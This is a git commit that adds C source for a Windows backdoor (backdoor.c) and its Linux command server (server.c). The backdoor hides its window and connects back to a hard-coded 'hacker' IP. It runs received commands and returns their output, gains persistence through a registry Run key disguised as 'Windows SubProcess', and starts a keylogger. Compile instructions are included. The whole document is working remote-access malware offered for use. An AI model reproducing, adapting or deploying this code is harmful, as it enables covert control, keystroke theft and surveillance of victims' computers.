02098de62e03790f8b93aa5fd5e737ee9c203414
ROHIDH <87977972+CodeCRAFT-rk@users.noreply.github.com>
2021-11-09 17:53:53 +0530

    Add files via upload

---
+++ backdoor.c
@@ -0,0 +1,224 @@
+
+/* 
+ * compile this file in windows os
+ * if you encounder any error like this => {
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0x5c5): undefined reference to `send@16'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0x620): undefined reference to `send@16'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0x6ab): undefined reference to `send@16'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0x6ef): undefined reference to `send@16'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0x790): undefined reference to `recv@16'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0x7c2): undefined reference to `closesocket@4'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0x7ca): undefined reference to `WSACleanup@0'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0x92d): undefined reference to `send@16'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0x9a1): undefined reference to `WSAStartup@8'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0x9d0): undefined reference to `socket@12'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0xa04): undefined reference to `inet_addr@4'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0xa16): undefined reference to `htons@4'
+    C:\Users\USER\AppData\Local\Temp\ccc67Kmi.o:backdoor.c:(.text+0xa3c): undefined reference to `connect@12'
+ * }
+ * you can use the following command in order to compile it in windows os
+ * gcc <filename.c> -o <outputFileName.exe> -lws2_32
+ */
+
+
+/* 
+ * if don't have windows then run the following commands in order to compile it in any linux os
+ * sudo apt update
+ * sudo apt install mingw-w64
+ * i686-w64-mingw32-gcc -o backdoor.exe backdoor.c -lwininet -lwsock32
+ * 
+ * here -lwininet and -lwsock32 are the libraries that we are used extra that linux don't have in default
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <winsock2.h>
+#include <windows.h>
+#include <winuser.h>
+#include <wininet.h>
+#include <windowsx.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+
+#include "key_logger.c"
+#include "string_cut.c"
+
+#define bzero(p) (void)memset(p, 0, sizeof(p));
+
+int sock;
+
+
+int bootRun()
+{
+    // creating error/success string in order to send it to server
+    char error[128] = "Failed\n";
+    char success[128] = "Created at : HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+
+    TCHAR szPath[MAX_PATH]; // 
+    /* 
+    * TCHAR => is basically windows 32 bit charecter string that cah be used to describe unicode.. strings
+    * MAX_PATH => is maximum path length limitation on windows 10 , it is 260 charecters
+    * */
+
+    DWORD pathLen = 0; // DWORD => it is a short for "double word" , it is a datatype that is an unsigned 32 unit of data and can contain an int value
+
+    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
+
+    if (pathLen == 0)
+    {
+        send(sock, error, sizeof(error), 0);
+        return -1;
+    }
+
+    // creating a new registry key value
+    HKEY NewVal; // and this value is a handle to a open registry key
+
+    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != 0) // if it doesn't work then following
+    {
+        send(sock, error, sizeof(error), 0);
+        return -1;
+    }
+
+    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+
+    if (RegSetValueEx(NewVal, TEXT("Windows SubProcess"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != 0)// if it doesn't work then following
+    {
+        RegCloseKey(NewVal);
+        send(sock, error, sizeof(error), 0);
+        return -1;
+    }
+
+    RegCloseKey(NewVal);
+    send(sock, success, sizeof(success), 0);
+    return 0;
+}
+
+
+void Shell()
+{
+    char buffer[1024];
+    char container[1024];
+    char total_response[18384];
+
+    while (1)
+    {
+    jump:
+        bzero(buffer);
+        bzero(container);
+        bzero(total_response);
+        recv(sock, buffer, 1024, 0);
+
+        if (strncmp("exit",buffer, 4) == 0)
+        {
+            closesocket(sock);
+            WSACleanup();
+            exit(0);
+        }
+        // else if (strncmp("close",buffer, 5) == 0)
+        // {
+        //     closesocket(sock);
+        //     WSACleanup();
+        // start:
+        //     while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
+        //     {
+        //         Sleep(1);
+        //         goto start;
+        //     }
+        // }
+
+        else if (strncmp("cd ", buffer, 3) == 0)
+        {
+            chdir(str_cut(buffer, 3, 100));
+        }
+        else if (strncmp("persist", buffer, 7) == 0)
+        {
+            bootRun();
+        }
+        else if (strncmp("start_logger", buffer, 12) == 0)
+        {
+            // creating a new thread to handle the logger function indipendently with the main thread
+            HANDLE thread;
+            // creating a thread for the logger func
+            thread = CreateThread(NULL, 0, logger, NULL, 0, NULL);
+            goto jump;
+        }
+        else
+        {
+            FILE *fp;
+            /* 
+            opening the buffer as a process/task 
+            so whatever stored in the buffer will ran as a certial process/task that the system should execute
+            and storing the results in fp variable
+             */
+            fp = _popen(buffer, "r"); // by siimply we can say that read the buffer and execute it
+            while (fgets(container, 1024, fp) != NULL)
+            {
+                strcat(total_response, container);
+            }
+            send(sock, total_response, sizeof(total_response), 0); // sending the total response to server
+            fclose(fp); // close the process
+        }
+    }
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int ncmdShow) // main entry function
+{
+    /* 
+    hinstance is a handle to an instance or handle to module os uses to value to identify the executable when
+    it is loaded in the memovry and hInstance handle is needed for some windows functions
+     */
+    // ipCmdLine argument has the unicode unix string
+    // cmdShow it is just a flag that says the app will be minimised maximised or show normaly
+
+    // hiding the window
+    HWND stealth; // creating the handle to the window
+    AllocConsole();
+    stealth = FindWindowA("ConsoleWindowClass", NULL); // FindWindowA will return the handle to the top level window , it takes two args 1=> class name , 2=> window name which is here NULL
+    ShowWindow(stealth, 0); // it determines wheather we want to show the window or not
+
+    // create the socket obj
+    struct sockaddr_in ServAddr;
+    unsigned short ServPort;
+    char *ServIP;
+    WSADATA wsaData; // WSADATA is a structure that contain information about windows socket
+
+    ServIP = "192.168.56.1"; // hacker machine ip addr
+    ServPort = 50005; // port addr
+
+    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
+    {
+        exit(1);
+    }
+
+    sock = socket(AF_INET, SOCK_STREAM, 0); // AF_INET => using ipv4 , SOCK_STREAM => using tcp connection
+
+    memset(&ServAddr, 0, sizeof(ServAddr)); // clearing the ServAddr memory with 0
+
+    ServAddr.sin_family = AF_INET;
+    ServAddr.sin_addr.s_addr = inet_addr(ServIP); // inet_adrr is for to convert the string text to ip address format
+    ServAddr.sin_port = htons(ServPort);          // htons for int to port format
+
+start:
+    while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
+    {
+        Sleep(10);// waiting for 10 milliseconds
+        goto start;
+    }
+
+    // creating the beep sound
+    MessageBeep(10);
+
+    // creating a message box to prompt the user that it is been hacked [just for crazy..]
+    MessageBox(NULL,TEXT("Your Device Has Been Hacked!!!"),TEXT("Do Not Play With Rohidh"),MB_OK | MB_ICONSTOP);
+
+    // int i;
+    // for(i=0;i<=10;i++)
+    //     MessageBox(NULL,TEXT("Your Device Has Been Hacked!!!"),TEXT("HACKED BY ROHIDH KRISHNA"),MB_OK | MB_ICONERROR);
+    // if (i==11)
+    //     MessageBox(NULL,TEXT("Engane und?"),TEXT("HACKED BY ROHIDH"),MB_OK | MB_ICONERROR);
+
+    Shell();
+}
---
+++ server.c
@@ -0,0 +1,106 @@
+
+// you can simply compile this file in any linux os
+// it only gonna work for linux os because some libraries used in this file is only gonna have in linux
+// i think windows c language SDK have this like varients , if you want to compile it in windows you have to reserch about it..
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+int main()
+{
+    int sock, client_socket;
+    char buffer[1024];
+    char response[18384];
+
+    struct sockaddr_in server_address, client_address; 
+
+    int i = 0;
+    int optval = 1;
+    socklen_t client_length;
+
+    sock = socket(AF_INET, SOCK_STREAM, 0); // these are documented in backdoor.c file
+
+    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
+    {
+        printf("Error Setting TCP Socket Options!\n");
+        return 1;
+    }
+
+    // setting up the server socket
+    server_address.sin_family = AF_INET;
+    server_address.sin_addr.s_addr = inet_addr("192.168.56.1"); // hacker ip
+    server_address.sin_port = htons(50005);
+
+    // binding the sock with server_address
+    bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));
+
+    listen(sock, 5); // listening
+    client_length = sizeof(client_address);
+    // connecting with the client socket
+    client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length);
+
+    while (1)
+    {
+    jump:
+        // clearning the buffer and response with 0
+        bzero(&buffer, sizeof(buffer));
+        bzero(&response, sizeof(response));
+
+        printf("\n* Shell#%s~$:", inet_ntoa(client_address.sin_addr)); // just a fancy client indiating line with it's ip addr
+
+        fgets(buffer, sizeof(buffer), stdin);
+        /*
+         * stdin => is meant by how we want to access the information , or define simply where we are getting the commands?
+         * we are getting the commands from standard input
+         */
+
+        /* 
+         * we many receive the buffer with newline char so we are
+         * removing the newline charecter from the buffer
+         */
+        strtok(buffer, "\n");
+
+
+        write(client_socket, buffer, sizeof(buffer));
+        /* 
+         * write func is same as send
+         * we using write because it is simpler than send since it takes only 3 args
+         */
+
+        if (strncmp("exit", buffer, 4) == 0) // if the buffer is exit then quite the program
+        {
+            break;
+        }
+        // else if (strncmp("close", buffer, 5) == 0)
+        // {
+        //     break;
+        // }
+        else if (strncmp("cd ",buffer,3) == 0){
+            goto jump; // because it will not gonna receive any message and stuck in the else code block
+        }
+        else if (strncmp("start_logger",buffer,12) == 0){ // event to start the logger func
+            goto jump;
+        }
+        else if (strncmp("persist",buffer,7) == 0){ // event to storing the backdoor exe file perminently in the windows registry
+            recv(client_socket,response,sizeof(response),0);
+            printf("%s\n",response);
+        }
+        else
+        {
+            recv(client_socket, response, sizeof(response), MSG_WAITALL);
+            /* 
+             * MSG_WAITALL => this flag will tell the program to block the operation until the full request is satisfied
+             * if you are intrested in recv function and all it's flags
+             * you can visit this site ->
+             * https://man7.org/linux/man-pages/man2/recv.2.html
+             */
+            printf("%s", response);
+        }
+    }
+}
